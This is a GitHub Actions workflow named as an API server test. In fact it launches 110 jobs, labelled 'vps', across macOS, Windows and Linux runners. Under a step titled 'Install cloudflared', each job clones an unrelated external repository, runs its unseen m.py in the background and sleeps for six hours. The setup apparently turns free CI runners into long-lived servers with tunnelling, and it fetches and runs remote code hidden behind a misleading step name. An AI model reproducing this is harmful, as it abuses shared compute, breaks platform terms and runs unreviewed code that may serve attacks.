name: Multi-OS API Server Test

on:
  push:
  workflow_dispatch:  # Manual trigger

jobs:
  macos-api-servers:
    runs-on: macos-26-xlarge
    timeout-minutes: 360  # 6 hours
    strategy:
      matrix:
        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
          
      - name: Install Python dependencies
        run: |
          pip3 install flask requests
          
      - name: Setup Node.js (for m.js)
        uses: actions/setup-node@v4
        with:
          node-version: '18'
          
      - name: Install cloudflared (macOS)
        run: |
          git clone https://github.com/venomxtest10test/noobvenom.git
          cd noobvenom
          # Download macOS version of cloudflared
          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz
          tar -xzf cloudflared-darwin-amd64.tgz
          chmod +x cloudflared
          sudo mv cloudflared /usr/local/bin/
          
      - name: Create m.js placeholder (if not exists)
        run: |
          if [ ! -f m.js ]; then
            echo "// Your m.js script" > m.js
            echo "console.log('m.js running with:', process.argv.slice(2));" >> m.js
            echo "setTimeout(() => console.log('Done'), 5000);" >> m.js
          fi
          
      - name: Run macOS API Server
        run: |
          cd noobvenom
          echo "üçé Starting macOS API Server ${{ matrix.vps }}"
          python3 m.py &
          SERVER_PID=$!
          echo "Server PID: $SERVER_PID"
          
          # Wait for server to start
          sleep 10
          
          # Test the API
          echo "Testing API endpoint..."
          curl -s http://localhost:5000/api/status || echo "API not ready yet"
          
          # Keep running for 6 hours
          echo "üïê Running for 6 hours..."
          sleep 21600
          
          # Cleanup
          kill $SERVER_PID
          echo "‚úÖ macOS API Server ${{ matrix.vps }} completed"

  windows-api-servers:
    runs-on: windows-latest
    timeout-minutes: 360  # 6 hours
    strategy:
      matrix:
        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
          
      - name: Install Python dependencies
        run: |
          pip install flask requests
          
      - name: Setup Node.js (for m.js)
        uses: actions/setup-node@v4
        with:
          node-version: '18'
          
      - name: Install cloudflared (Windows)
        run: |
          git clone https://github.com/venomxtest10test/noobvenom.git
          cd noobvenom
          # Download Windows version of cloudflared
          Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
          
      - name: Create m.js placeholder (if not exists)
        run: |
          if (!(Test-Path "m.js")) {
            "// Your m.js script" | Out-File -FilePath "m.js"
            "console.log('m.js running with:', process.argv.slice(2));" | Add-Content -Path "m.js"
            "setTimeout(() => console.log('Done'), 5000);" | Add-Content -Path "m.js"
          }
          
      - name: Run Windows API Server
        run: |
          cd noobvenom
          echo "ü™ü Starting Windows API Server ${{ matrix.vps }}"
          Start-Process -NoNewWindow -FilePath "python" -ArgumentList "m.py" -PassThru
          $serverProcess = Get-Process python -ErrorAction SilentlyContinue
          echo "Server Process: $($serverProcess.Id)"
          
          # Wait for server to start
          Start-Sleep -Seconds 10
          
          # Test the API
          echo "Testing API endpoint..."
          try {
            Invoke-RestMethod -Uri "http://localhost:5000/api/status" -ErrorAction Stop
            echo "API is running"
          } catch {
            echo "API not ready yet"
          }
          
          # Keep running for 6 hours
          echo "üïê Running for 6 hours..."
          Start-Sleep -Seconds 21600
          
          # Cleanup
          Stop-Process -Id $serverProcess.Id -Force -ErrorAction SilentlyContinue
          echo "‚úÖ Windows API Server ${{ matrix.vps }} completed"

  linux-api-servers:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours
    strategy:
      matrix:
        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
          
      - name: Install Python dependencies
        run: |
          pip install flask requests
          
      - name: Setup Node.js (for m.js)
        uses: actions/setup-node@v4
        with:
          node-version: '18'
          
      - name: Install cloudflared
        run: |
          git clone https://github.com/venomxtest10test/noobvenom.git
          cd noobvenom
          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
          chmod +x cloudflared
          sudo mv cloudflared /usr/local/bin/
          
      - name: Create m.js placeholder (if not exists)
        run: |
          if [ ! -f m.js ]; then
            echo "// Your m.js script" > m.js
            echo "console.log('m.js running with:', process.argv.slice(2));" >> m.js
            echo "setTimeout(() => console.log('Done'), 5000);" >> m.js
          fi
          
      - name: Run Linux API Server
        run: |
          cd noobvenom
          echo "üêß Starting Linux API Server ${{ matrix.vps }}"
          python m.py &
          SERVER_PID=$!
          echo "Server PID: $SERVER_PID"
          
          # Wait for server to start
          sleep 10
          
          # Test the API
          echo "Testing API endpoint..."
          curl -s http://localhost:5000/api/status || echo "API not ready yet"
          
          # Keep running for 6 hours
          echo "üïê Running for 6 hours..."
          sleep 21600
          
          # Cleanup
          kill $SERVER_PID
          echo "‚úÖ Linux API Server ${{ matrix.vps }} completed"
